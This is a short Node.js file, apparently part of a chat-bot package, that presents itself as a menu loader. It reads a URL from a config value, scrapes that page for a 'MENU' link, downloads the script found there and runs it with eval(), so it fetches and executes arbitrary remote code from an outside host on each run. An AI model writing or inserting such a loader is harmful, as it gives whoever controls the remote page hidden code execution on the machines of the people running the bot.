//  [BEVANSOCEITY✌️ QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by infiniteB 
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchMENUUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("MENU")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('MENU not found 😭');
    }

    console.log('MENU loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchMENUUrl();
